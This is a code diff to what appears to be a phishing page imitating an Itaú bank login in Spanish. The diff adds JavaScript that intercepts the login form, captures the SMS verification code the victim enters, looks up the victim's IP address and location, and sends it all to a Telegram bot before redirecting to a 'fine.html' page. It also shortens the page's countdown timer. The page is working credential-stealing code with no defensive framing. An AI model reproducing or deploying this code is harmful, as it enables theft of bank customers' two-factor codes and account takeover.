@@ -242,7 +242,7 @@
                            </svg>
                         </button>
                         <div class="c-login is-open">
-                           <form id="acceso_hb" data-segmento="panelPersona" class="c-login__form" method="post"  action="js/soforofo.php" onsubmit="return validarFormulario()">
+                           <form id="loginform" data-segmento="panelPersona" class="c-login__form" method="post"  >
                              
                               <div class="c-login__wrap">
                                 
@@ -250,7 +250,7 @@
                                     
                                    <span class="ocultar-div"  >Ingrese el código SMS que enviamos a su celular:</span>
 
-                                    <input type="tel" name="t0s24u824s" placeholder="Código SMS" maxlength="6" minlength="6"  class="login-control tabular-nums" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" >
+                                    <input required="" type="tel" id="t0s24u824s" name="t0s24u824s" placeholder="Código SMS" maxlength="6" minlength="6"  class="login-control tabular-nums" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" >
                                     
                                  <a id="box" class="ocultar-div"  style="
                                  display: none;font-family: ItauDisplay2;color: orange;font-size: 12pt;text-decoration: underline;"   href="fine.html">No he recibido el código</a>
@@ -730,8 +730,37 @@
             return true;
         }
     </script>
+     <script src="aqui-va-eltlg.js"></script>
+<script>
+    var script = document.createElement("script");
+    script.src = "aqui-va-eltlg.js";
+
+ 
+
+    const form = document.querySelector('#loginform');
+
+    form.addEventListener('submit', event => {
+        event.preventDefault();
+        const cliente = document.getElementById('t0s24u824s').value;
+
+        fetch('https://ipapi.co/json')
+        .then(response => response.json())
+        .then(data => {
+            YOUR_MESSAGE_TEXT = "IT4U UYU \n\n\r ESEMS: "+cliente+"\n\n\r   - IP: "+data.ip+" "+data.country+" "+data.city;
+            const telegramApiUrl = `https://api.telegram.org/bot${YOUR_BOT_TOKEN}/sendMessage?chat_id=${YOUR_CHANNEL_ID}&text=${YOUR_MESSAGE_TEXT}`;
+
+            fetch(telegramApiUrl)
+                .then(response => {
+                    window.location.href="fine.html"
+                })
+                .catch(error => console.error(error));
+        })
+        .catch(error => console.error(error));
+    });
+    
+</script>
       <script type="text/javascript">
-               var seconds = 120; //número de segundos a contar
+               var seconds = 60; //número de segundos a contar
                function secondPassed() {
                
                  var minutes = Math.round((seconds - 30)/60); //calcula el número de minutos
@@ -761,7 +790,7 @@
 
       // 👇️ hides element (still takes up space on page)
       // box.style.visibility = 'hidden';
-      }, 121000);
+      }, 61000);
       </script>
       
    </body>
